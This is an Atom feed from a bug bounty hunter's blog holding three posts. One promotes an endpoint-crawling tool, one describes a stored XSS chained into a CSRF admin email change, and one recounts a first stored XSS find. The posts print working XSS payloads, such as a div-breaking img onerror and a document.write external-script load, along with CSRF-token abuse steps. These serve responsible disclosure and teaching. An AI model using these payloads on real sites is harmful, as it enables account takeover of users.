<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2021-01-26T11:53:13+05:30</updated><id>http://localhost:4000/feed.xml</id><title type="html">Micha3lb3n’s blog</title><subtitle>Micha3lb3n's blog</subtitle><entry><title type="html">Why looking through source of a web page matters</title><link href="http://localhost:4000/why-looking-through-source-matters/" rel="alternate" type="text/html" title="Why looking through source of a web page matters" /><published>2020-07-26T00:00:00+05:30</published><updated>2020-07-26T00:00:00+05:30</updated><id>http://localhost:4000/why-looking-through-source-matters</id><content type="html" xml:base="http://localhost:4000/why-looking-through-source-matters/">&lt;head&gt;
  &lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/css/main1.css&quot; /&gt;
  &lt;!-- Latest compiled and minified CSS --&gt;
  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css&quot; /&gt;

  &lt;!-- jQuery library --&gt;
  &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js&quot;&gt;&lt;/script&gt;

  &lt;!-- Popper JS --&gt;
  &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js&quot;&gt;&lt;/script&gt;

  &lt;!-- Latest compiled JavaScript --&gt;
  &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;

  &lt;title&gt;Why looking through source of a web page matters&lt;/title&gt;
&lt;/head&gt;

&lt;section id=&quot;one&quot; class=&quot;wrapper style1&quot;&gt;
  &lt;div class=&quot;inner&quot;&gt;
        
    &lt;article class=&quot;feature left&quot; style=&quot;background-color: white; color: black;&quot;&gt;
        &lt;center style=&quot;padding-bottom: 20px;&quot;&gt;
            &lt;h2 style=&quot;padding: 20px; color: black;&quot;&gt;&lt;b&gt;Why looking through source of a web page matters&lt;/b&gt;&lt;/h2&gt;
            &lt;div style=&quot;color:#0067a3&quot;&gt;
              July 26, 2020
              &lt;br /&gt;
              ~3 minutes
            &lt;/div&gt;
            &lt;!-- &lt;span class=&quot;&quot;&gt;&lt;img src=&quot;/assets/images/pic01.jpg&quot; alt=&quot;&quot; height=&quot;200px&quot; width=&quot;300px&quot; /&gt;&lt;/span&gt; --&gt;
        &lt;/center&gt;
        &lt;div class=&quot;content&quot; style=&quot;padding:10px&quot;&gt;
            &lt;p style=&quot;font-size: 20px;&quot;&gt;
                So, let's start from the basics, so that everyone is in the same track! 
                &lt;br /&gt;
                &lt;br /&gt;

                &lt;b&gt;What does the source page contain?&lt;/b&gt;
                &lt;br /&gt;
                &lt;br /&gt;

                It contains the HTML, CSS and javascript code which is powering the websites, apart from the backend services if any.
                The HTML and CSS code are mostly doing static stuff and so this won't be of much interest except when you are hunting for bugs like XSS.
                &lt;br /&gt;
                &lt;br /&gt;

                &lt;b&gt;What remains? Javascript!&lt;/b&gt;

                &lt;br /&gt;&lt;br /&gt;

                This is the stuff that we are most interested in.😋
                &lt;br /&gt;
                Javascript is responsible for manipulating the DOM of the website, or in other words making static content dynamic. You can't be displaying an user specific page just with HTML and CSS. The website must use a backend setup, and use javascript to query endpoints, fetch a particular data and change the contents depending on who is viewing the page.

                &lt;br /&gt;&lt;br /&gt;

                &lt;b&gt;What could possibly go wrong here?&lt;/b&gt;

                &lt;br /&gt;&lt;br /&gt;

                Not all endpoints are hit! There may be endpoints which the developers might have forgotten to remove. They might be endpoints, which are current not used by the company, but still in the source. Something like &lt;code&gt;/api/admin/analytics?user=michaelben&lt;/code&gt;. Let's say the company previously used this endpoint for analytics, and it returns all the user's usage data or leaks any other sensitive data on changing the &lt;code&gt;user&lt;/code&gt; parameter.

                &lt;br /&gt;&lt;br /&gt;

                &lt;b&gt;Yeah, it seems like looking through javascript code actually is useful. So, do I have to manually look through every page I visit everytime?&lt;/b&gt;

                &lt;br /&gt;&lt;br /&gt;

                This is where my friend &lt;a href=&quot;https://github.com/micha3lb3n/SourceWolf/&quot;&gt;SourceWolf&lt;/a&gt; comes in. He is ready to do all the hard word for you. You just need to provide the list of URLs, and he crawls the responses for you to find all the endpoints.
                &lt;br /&gt;&lt;br /&gt;
                He currently only searches for endpoints in the files, but you can expect in the future that he will be adding more tricks up his sleeve like creating a custom wordlist for a specific target based on the words obtained from the source, and flagging secret api keys leaked in the source.

                &lt;br /&gt;&lt;br /&gt;

                He lives &lt;a href=&quot;https://github.com/micha3lb3n/SourceWolf/&quot;&gt;here&lt;/a&gt;. Do pay him a visit. He's feeling lonely out there!

                It can also serve as a endpoint bruteforcer and something that can get you the status codes of a list of URLs really fast. For more detailed information, check out the docs!

                &lt;br /&gt;&lt;br /&gt;

                An amazing feature which SourceWolf has is, it automatically checks for updates right from the terminal everytime he is run, and he notifies the user along with &lt;b&gt;any bug fixes and new features&lt;/b&gt; added to the new version. You can also update SourceWolf directly from the terminal without the need for you to go the repo for you to clone it back again every time you want to update.

                &lt;br /&gt;&lt;br /&gt;

            &lt;/p&gt;
            &lt;center&gt;&lt;span class=&quot;&quot;&gt;&lt;img src=&quot;/assets/images/sourcewolf.jpg&quot; alt=&quot;&quot; height=&quot;30%&quot; width=&quot;80%&quot; /&gt;&lt;/span&gt;&lt;/center&gt;
            &lt;br /&gt;&lt;br /&gt;

            &lt;b&gt;Link to the repository: &lt;a href=&quot;https://github.com/micha3lb3n/SourceWolf/&quot;&gt;https://github.com/micha3lb3n/SourceWolf/&lt;/a&gt;&lt;/b&gt;

            &lt;br /&gt;&lt;br /&gt;
            &lt;br /&gt;&lt;br /&gt;
        &lt;/div&gt;
        Share: &lt;a class=&quot;icon fa-twitter&quot; target=&quot;_blank&quot; href=&quot;https://twitter.com/intent/tweet?text=Check out 'Why looking through source of a web page matters' by @micha3lb3n at https://micha3lb3n.github.io/why-looking-through-source-matters/&quot; data-size=&quot;large&quot; url=&quot;https://micha3lb3n.github.io/why-looking-through-source-matters/&quot;&gt;
    Tweet&lt;/a&gt;
    &lt;/article&gt;

  &lt;/div&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html">Why looking through source of a web page matters Why looking through source of a web page matters July 26, 2020 ~3 minutes So, let's start from the basics, so that everyone is in the same track! What does the source page contain? It contains the HTML, CSS and javascript code which is powering the websites, apart from the backend services if any. The HTML and CSS code are mostly doing static stuff and so this won't be of much interest except when you are hunting for bugs like XSS. What remains? Javascript! This is the stuff that we are most interested in.😋 Javascript is responsible for manipulating the DOM of the website, or in other words making static content dynamic. You can't be displaying an user specific page just with HTML and CSS. The website must use a backend setup, and use javascript to query endpoints, fetch a particular data and change the contents depending on who is viewing the page. What could possibly go wrong here? Not all endpoints are hit! There may be endpoints which the developers might have forgotten to remove. They might be endpoints, which are current not used by the company, but still in the source. Something like /api/admin/analytics?user=michaelben. Let's say the company previously used this endpoint for analytics, and it returns all the user's usage data or leaks any other sensitive data on changing the user parameter. Yeah, it seems like looking through javascript code actually is useful. So, do I have to manually look through every page I visit everytime? This is where my friend SourceWolf comes in. He is ready to do all the hard word for you. You just need to provide the list of URLs, and he crawls the responses for you to find all the endpoints. He currently only searches for endpoints in the files, but you can expect in the future that he will be adding more tricks up his sleeve like creating a custom wordlist for a specific target based on the words obtained from the source, and flagging secret api keys leaked in the source. He lives here. Do pay him a visit. He's feeling lonely out there! It can also serve as a endpoint bruteforcer and something that can get you the status codes of a list of URLs really fast. For more detailed information, check out the docs! An amazing feature which SourceWolf has is, it automatically checks for updates right from the terminal everytime he is run, and he notifies the user along with any bug fixes and new features added to the new version. You can also update SourceWolf directly from the terminal without the need for you to go the repo for you to clone it back again every time you want to update. Link to the repository: https://github.com/micha3lb3n/SourceWolf/ Share: Tweet</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/sourcewolf.jpg" /><media:content medium="image" url="http://localhost:4000/assets/images/sourcewolf.jpg" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Stored XSS to CSRF</title><link href="http://localhost:4000/stored-xss-to-csrf/" rel="alternate" type="text/html" title="Stored XSS to CSRF" /><published>2020-05-21T00:00:00+05:30</published><updated>2020-05-21T00:00:00+05:30</updated><id>http://localhost:4000/xss-to-csrf</id><content type="html" xml:base="http://localhost:4000/stored-xss-to-csrf/">&lt;head&gt;
  &lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/css/main1.css&quot; /&gt;
  &lt;!-- Latest compiled and minified CSS --&gt;
  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css&quot; /&gt;

  &lt;!-- jQuery library --&gt;
  &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js&quot;&gt;&lt;/script&gt;

  &lt;!-- Popper JS --&gt;
  &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js&quot;&gt;&lt;/script&gt;

  &lt;!-- Latest compiled JavaScript --&gt;
  &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
  

  &lt;title&gt;Stored XSS to CSRF&lt;/title&gt;
  &lt;style&gt;
    .content{
        font-size: 20px;
    }
   
  &lt;/style&gt;
&lt;/head&gt;

&lt;section id=&quot;one&quot; class=&quot;wrapper style1&quot;&gt;
  &lt;div class=&quot;inner&quot;&gt;
    
    &lt;article class=&quot;feature left&quot; style=&quot;background-color: white; color: black;&quot;&gt;
        &lt;center style=&quot;padding-bottom: 20px;&quot;&gt;
            &lt;h2 style=&quot;padding: 20px; color: black;&quot;&gt;&lt;b&gt;Stored XSS to CSRF&lt;/b&gt;&lt;/h2&gt;
            &lt;div style=&quot;color:#0067a3&quot;&gt;
              May 21, 2020
              &lt;br /&gt;
              ~6 minutes
            &lt;/div&gt;
            
        &lt;/center&gt;
        &lt;div class=&quot;content&quot; style=&quot;padding:10px;&quot;&gt;
            &lt;p&gt;
                There's almost no limit what you can do with XSS, stored XSS in particular, in most of the situations. It allows javascript code execution in the victim's browser. XSS is not just about popping an alert box and stealing cookies is just one method, which is decreasing because many websites have HttpOnly flag on their cookies which protects them. In that case, if you don't know exploiting it other than stealing cookies, even though your submission would be accepted, you could be missing out on high impacts, like account takeover. 
                &lt;br /&gt;&lt;br /&gt;

                I received an invite for a private program a few days back. It was a workflow management websites, where you could assign your team members project, and upload files, and other stuff with different levels of users. I decided to hack on it, as these kind of different user privileges super excites me due to the large scope of privilege escalation.

                So, I started browsing the site understanding it's functionality. Now, there was a project section, where users could keep their project private, or add some of their team members in it. There was a functionality to add comments to the project, and the members added in the project had the option to add like to the comment. But knowing the project ID, I was able to add likes to a project, which I was not a part of, and had no visibility permissions. I reported this, and I received a response stating that the project ID is not predictable, and status was changed to &quot;Won't fix&quot; and it got me only 5 points☹️

                Next, there was a functionality to search other users, by their username. The endpoint was something like 
            &lt;/p&gt;
            &lt;center&gt;
                &lt;img src=&quot;/assets/images/stored-xss-to-csrf/api_request.png&quot; alt=&quot;&quot; height=&quot;30%&quot; width=&quot;80%&quot; /&gt;
            &lt;/center&gt;
            &lt;br /&gt;&lt;br /&gt;
            &lt;p&gt;
                I have stripped out a lot of other things for simplicity. This would return a response containing all the users whose name starts with &quot;micha&quot; like michaelben, michael etc.
                So the response was something like
            &lt;/p&gt;
            &lt;center&gt;
                &lt;img src=&quot;/assets/images/stored-xss-to-csrf/api_response.png&quot; alt=&quot;&quot; height=&quot;30%&quot; width=&quot;80%&quot; /&gt;
            &lt;/center&gt;
            &lt;br /&gt;&lt;br /&gt;
            &lt;p&gt;
                Again, the response contained a lot of other data, among which this was the most interesting ones. On a first glance, I thought this is leaking the address and mobile numbers of other team members, but later realised that they were actually visible on their profile.
                &lt;br /&gt;
                Then the LIMIT parameter in the GET request caught my eyes, and I changed it to 1000. I got a hell lot of data regarding each of the team member. The response included the name of private documents uploaded by each user which was visible only to the user. Additionally, there were other details that the endpoint leaked such as private projects, and other information which were supposed to visible only to the particular user. 
                &lt;br /&gt;
                On reporting this, I got a reply saying this was by design ! 😨
                Obviously, I couldn't do anything.
            &lt;/p&gt;
            &lt;br /&gt;&lt;br /&gt;
            &lt;p&gt;
                I previously injected the XSS payload, &lt;pre&gt;&quot;&amp;gt;&amp;lt;img src onerror=alert(1)&amp;gt;&lt;/pre&gt; in one of the members name to test XSS, and it obviously didn't fire. I was just browsing using the admin account. I visited the member's profile with the payload. There was an option to deactivate the user. After deactivating, you receive a pop up saying &quot;Deactivated {member name}&quot;. But when I deactivated this user, I got an invalid image symbol. I found this interesting. There are two possibilities which is mostly implemented in such a situation. One would be render the whole payload safely by some kind of filtering, and the other would be to completely remove the payload. But this removed only the tag , and so it loooked like &lt;pre style=&quot;display: inline;&quot;&gt;&amp;lt; img src=&quot;&quot;&amp;gt;&lt;/pre&gt;. It was vulnerable to HTML and CSS injection, I could take down the whole page using &lt;pre&gt;&amp;lt; style&amp;gt;body{display: none}&amp;lt;/style&amp;gt;&lt;/pre&gt;. But I was aiming XSS.

                I tried to bypass this, but I couldn't. I decided to look at the source code. I knew that it was parsing my HTML tags. The notification content was enclosed within a div tag. I immediately closed the div tag, and entered my payload. So the final payload was &lt;pre&gt;&quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;img src onerror=alert(document.domain)&lt;/pre&gt;.

                Now when I deactivated the user with this payload, the payload fired. But I could not get the session cookies using this method, due to the HttpOnly flag. But I could get the CSRF token, using which I could change the admin email address. But again, since everything was against me, I was limited by the number of characters in the name where the payload must be injected. 

                So, I thought of referencing an external script to the page. I did &lt;pre&gt;document.getElementById(&quot;id&quot;).innerHTML = '&amp;lt; script src=&quot;http://localhost/alert.js&quot;&amp;gt;&amp;lt;/script&amp;gt;'&lt;/pre&gt;, where alert.js contained alert(document.domain), which would fire if the script was included. But it didn't. On more researching onto this, I found that scripts do not load in an already loaded page using the innerHTML method. Alternatively, using &lt;pre&gt;document.write(&quot;&amp;lt; script src='http://localhost/alert.js'&amp;gt;&amp;lt;/script&amp;gt;&quot;)&lt;/pre&gt; could achieve it. I did that, and I got the alert. 
                Now just a simple POC.
            &lt;/p&gt;
            &lt;br /&gt;&lt;br /&gt;
            &lt;center&gt;
                &lt;img src=&quot;/assets/images/stored-xss-to-csrf/poc.png&quot; alt=&quot;&quot; height=&quot;30%&quot; width=&quot;80%&quot; /&gt;
            &lt;/center&gt;
            &lt;br /&gt;&lt;br /&gt;
            &lt;p&gt;
                &lt;ul&gt;
                    &lt;li&gt;Get the cookie string&lt;/li&gt;
                    &lt;li&gt;Extract only the value of CSRF-TOKEN from the string&lt;/li&gt;
                    &lt;li&gt;Send the POST request to change the email address with the CSRF-TOKEN in the header&lt;/li&gt;
                &lt;/ul&gt;
                Just don't stop with an alert box if you find XSS. It has a lot more potential. 
                &lt;br /&gt;
                See you again in the next blog post :)
            &lt;/p&gt;
        &lt;/div&gt;
        Share: &lt;a class=&quot;icon fa-twitter&quot; target=&quot;_blank&quot; href=&quot;https://twitter.com/intent/tweet?text=Check out Stored XSS to CSRF by micha3lb3n at https://micha3lb3n.github.io/stored-xss-to-csrf/&quot; data-size=&quot;large&quot; url=&quot;https://micha3lb3n.github.io/&quot;&gt;
    Tweet&lt;/a&gt;
        &lt;br /&gt;&lt;br /&gt;
        
    &lt;/article&gt;
&lt;/div&gt;&lt;/section&gt;</content><author><name></name></author><summary type="html">Stored XSS to CSRF Stored XSS to CSRF May 21, 2020 ~6 minutes There's almost no limit what you can do with XSS, stored XSS in particular, in most of the situations. It allows javascript code execution in the victim's browser. XSS is not just about popping an alert box and stealing cookies is just one method, which is decreasing because many websites have HttpOnly flag on their cookies which protects them. In that case, if you don't know exploiting it other than stealing cookies, even though your submission would be accepted, you could be missing out on high impacts, like account takeover. I received an invite for a private program a few days back. It was a workflow management websites, where you could assign your team members project, and upload files, and other stuff with different levels of users. I decided to hack on it, as these kind of different user privileges super excites me due to the large scope of privilege escalation. So, I started browsing the site understanding it's functionality. Now, there was a project section, where users could keep their project private, or add some of their team members in it. There was a functionality to add comments to the project, and the members added in the project had the option to add like to the comment. But knowing the project ID, I was able to add likes to a project, which I was not a part of, and had no visibility permissions. I reported this, and I received a response stating that the project ID is not predictable, and status was changed to &quot;Won't fix&quot; and it got me only 5 points☹️ Next, there was a functionality to search other users, by their username. The endpoint was something like I have stripped out a lot of other things for simplicity. This would return a response containing all the users whose name starts with &quot;micha&quot; like michaelben, michael etc. So the response was something like Again, the response contained a lot of other data, among which this was the most interesting ones. On a first glance, I thought this is leaking the address and mobile numbers of other team members, but later realised that they were actually visible on their profile. Then the LIMIT parameter in the GET request caught my eyes, and I changed it to 1000. I got a hell lot of data regarding each of the team member. The response included the name of private documents uploaded by each user which was visible only to the user. Additionally, there were other details that the endpoint leaked such as private projects, and other information which were supposed to visible only to the particular user. On reporting this, I got a reply saying this was by design ! 😨 Obviously, I couldn't do anything. I previously injected the XSS payload, &quot;&amp;gt;&amp;lt;img src onerror=alert(1)&amp;gt; in one of the members name to test XSS, and it obviously didn't fire. I was just browsing using the admin account. I visited the member's profile with the payload. There was an option to deactivate the user. After deactivating, you receive a pop up saying &quot;Deactivated {member name}&quot;. But when I deactivated this user, I got an invalid image symbol. I found this interesting. There are two possibilities which is mostly implemented in such a situation. One would be render the whole payload safely by some kind of filtering, and the other would be to completely remove the payload. But this removed only the tag , and so it loooked like &amp;lt; img src=&quot;&quot;&amp;gt;. It was vulnerable to HTML and CSS injection, I could take down the whole page using &amp;lt; style&amp;gt;body{display: none}&amp;lt;/style&amp;gt;. But I was aiming XSS. I tried to bypass this, but I couldn't. I decided to look at the source code. I knew that it was parsing my HTML tags. The notification content was enclosed within a div tag. I immediately closed the div tag, and entered my payload. So the final payload was &quot;&amp;gt;&amp;lt;/div&amp;gt;&amp;lt;img src onerror=alert(document.domain). Now when I deactivated the user with this payload, the payload fired. But I could not get the session cookies using this method, due to the HttpOnly flag. But I could get the CSRF token, using which I could change the admin email address. But again, since everything was against me, I was limited by the number of characters in the name where the payload must be injected. So, I thought of referencing an external script to the page. I did document.getElementById(&quot;id&quot;).innerHTML = '&amp;lt; script src=&quot;http://localhost/alert.js&quot;&amp;gt;&amp;lt;/script&amp;gt;', where alert.js contained alert(document.domain), which would fire if the script was included. But it didn't. On more researching onto this, I found that scripts do not load in an already loaded page using the innerHTML method. Alternatively, using document.write(&quot;&amp;lt; script src='http://localhost/alert.js'&amp;gt;&amp;lt;/script&amp;gt;&quot;) could achieve it. I did that, and I got the alert. Now just a simple POC. Get the cookie string Extract only the value of CSRF-TOKEN from the string Send the POST request to change the email address with the CSRF-TOKEN in the header Just don't stop with an alert box if you find XSS. It has a lot more potential. See you again in the next blog post :) Share: Tweet</summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/stored-xss-to-csrf/poc.png" /><media:content medium="image" url="http://localhost:4000/assets/images/stored-xss-to-csrf/poc.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">My first bug !</title><link href="http://localhost:4000/my-first-bug/" rel="alternate" type="text/html" title="My first bug !" /><published>2020-05-17T16:11:05+05:30</published><updated>2020-05-17T16:11:05+05:30</updated><id>http://localhost:4000/my-first-bug</id><content type="html" xml:base="http://localhost:4000/my-first-bug/">&lt;head&gt;
  &lt;link rel=&quot;stylesheet&quot; href=&quot;/assets/css/main1.css&quot; /&gt;
  &lt;!-- Latest compiled and minified CSS --&gt;
  &lt;link rel=&quot;stylesheet&quot; href=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/css/bootstrap.min.css&quot; /&gt;

  &lt;!-- jQuery library --&gt;
  &lt;script src=&quot;https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js&quot;&gt;&lt;/script&gt;

  &lt;!-- Popper JS --&gt;
  &lt;script src=&quot;https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.16.0/umd/popper.min.js&quot;&gt;&lt;/script&gt;

  &lt;!-- Latest compiled JavaScript --&gt;
  &lt;script src=&quot;https://maxcdn.bootstrapcdn.com/bootstrap/4.4.1/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;

  &lt;title&gt;My first bug !&lt;/title&gt;
&lt;/head&gt;

&lt;section id=&quot;one&quot; class=&quot;wrapper style1&quot;&gt;
  &lt;div class=&quot;inner&quot;&gt;
        
    &lt;article class=&quot;feature left&quot; style=&quot;background-color: white; color: black;&quot;&gt;
        &lt;center style=&quot;padding-bottom: 20px;&quot;&gt;
            &lt;h2 style=&quot;padding: 20px; color: black;&quot;&gt;&lt;b&gt;My first bug !&lt;/b&gt;&lt;/h2&gt;
            &lt;div style=&quot;color:#0067a3&quot;&gt;
              May 18, 2020
              &lt;br /&gt;
              ~4 minutes
            &lt;/div&gt;
            &lt;!-- &lt;span class=&quot;&quot;&gt;&lt;img src=&quot;/assets/images/pic01.jpg&quot; alt=&quot;&quot; height=&quot;200px&quot; width=&quot;300px&quot; /&gt;&lt;/span&gt; --&gt;
        &lt;/center&gt;
        &lt;div class=&quot;content&quot; style=&quot;padding:10px&quot;&gt;
            &lt;p style=&quot;font-size: 20px;&quot;&gt;
                Yeah, finally after 2 weeks of persistent hunting in various domains, I was able to find out a bug on a site.✌ (I won’t be disclosing the site name for obvious reasons).The bug was stored cross site scripting (XSS) on the profile page of the site.
                &lt;br /&gt;&lt;br /&gt;

                For those of the people who have no idea what I am talking about, cross site scripting is a type of vulnerability which lets me execute any javascript code when someone visits a link with the vulnerability. For example, consider a web page http://www.greetuser.com/name=michaelben/ which displays a message “Hi michaelben”, which technically means anything which you supply in the name parameter will be displayed in the page. What if I put in &amp;lt; script&amp;gt;alert(1)&amp;lt;/script&amp;gt; in the name parameter? The page will be something like “Hi &amp;lt; script&amp;gt;alert(1)&amp;lt;/script&amp;gt;”. The browser executes the javascript code and an alert box pops us. The main idea behind this is not making an alert box pop up but the fact that I can execute any javascript code if the user input is not properly sanitized. Since the user input is being reflected on to the page, this is called reflected cross site scripting (XSS). There are a lot of ways to exploit this and I am not going into that.
                &lt;br /&gt;&lt;br /&gt;

                Next comes stored XSS which was found in this site. A really good example for this would be the “Samy (a person) worm” which occurred in the social networking site MySpace in the year 2005. He put in a javascript code in his profile page which makes any user visiting his profile send Samy a friend request and change the user’s bio to “but most of all, samy is my hero”, without their knowledge. And not only that, this javascript code also got copied onto any user’s profile visiting Samy’s page. This started propagating rapidly and affected one million accounts in 20 hours. By this, one could see the severity of this.
                &lt;br /&gt;&lt;br /&gt;

                Okay, now let’s get back to our original report, I was testing this site and the first thing I always test is to check for stored XSS on the profile page on every website. While signing up, it didn’t allow me to insert “&amp;lt;” onto any of the fields, and so I signed up normally. Then there was this edit profile section, where I could insert “&amp;lt;” here. I didn’t really understand what kind of logic was that🙄. They don’t allow special characters while signing up but they allow the same while editing the profile (Not a issue). So I changed my first name to an XSS payload (&amp;lt; script&amp;gt;alert(1)&amp;lt;/script&amp;gt;). No luck! It did some type of encoding and displayed it. The encoding was completely different. I had never seen such a thing on any site ever before. So I fired up burp and then noticed that as soon as I submit the name is sent as encoded text and after that, input displays as such⚠⚠️⚠️️!! So I changed the input inside the burp to the XSS payload. Still no luck! 😫
                &lt;br /&gt;&lt;br /&gt;

                But I knew this thing could be exploited. This time I encoded the payload and then changed the request in burp. Actually, the website design is such that after you click “Save changes” it does not redirect you to the profile page but stays there and so if the payload is executed, there would be no changes. This time the payload was actually executed but I thought it didn’t because it would be executed only on the pages where my first name is being displayed.
                &lt;br /&gt;&lt;br /&gt;

                I thought of coming back to the website after some time and signed out of all my test accounts. After 4 hours around 2:30 AM, I logged onto my test account, BOOM!! I got an alert box greeting me🤑. But the problem was I had no idea from where this was coming, having tested so many features and trying XSS in all of those. I was really confused. I reported the bug right away, but even without knowing what caused it 😂. And I got a reply straight away in 5 minutes telling the team were able to reproduce it and they told me that they will get back to me if they required further details. It was 3:00 AM, I decided to sleep and closed my laptop and tried sleeping. But I was too excited to sleep. I somehow wanted to find the reason for that bug. So I switched on my laptop again, and started backtracking all my actions. After 15 minutes, I knew the cause :)
                &lt;br /&gt;&lt;br /&gt;

                As the company was a startup, they did not realize the impact of stored XSS, so took down my whole profile page using javsscript, and altered it so that it showed whatever content I wanted. There was another critical possibility of stealing cookies leading to account takeover, but that wasn't going to reflect it's impact immediately to a non-security person. I wanted to show something that immediately catches their attention.
            &lt;/p&gt;
            &lt;center&gt;&lt;span class=&quot;&quot;&gt;&lt;img src=&quot;/assets/images/stored_xss.png&quot; alt=&quot;&quot; height=&quot;30%&quot; width=&quot;80%&quot; /&gt;&lt;/span&gt;&lt;/center&gt;
            &lt;br /&gt;&lt;br /&gt;
            &lt;p style=&quot;font-size: 20px;&quot;&gt;
                If you are into this kind of stuff, you probably know the excitement, when an alert box pops up and that too for the first time. I don't know whether this is strange or whatever, but I like it more with a firefox alert box, than a chromium one ;)
            &lt;/p&gt;
        &lt;/div&gt;
        Share: &lt;a class=&quot;icon fa-twitter&quot; target=&quot;_blank&quot; href=&quot;https://twitter.com/intent/tweet?text=Check out My first bug ! by micha3lb3n at https://micha3lb3n.github.io/my-first-bug/&quot; data-size=&quot;large&quot; url=&quot;https://micha3lb3n.github.io/&quot;&gt;
    Tweet&lt;/a&gt;
    &lt;/article&gt;
  &lt;/div&gt;
&lt;/section&gt;</content><author><name></name></author><summary type="html"></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/images/stored_xss.png" /><media:content medium="image" url="http://localhost:4000/assets/images/stored_xss.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry></feed>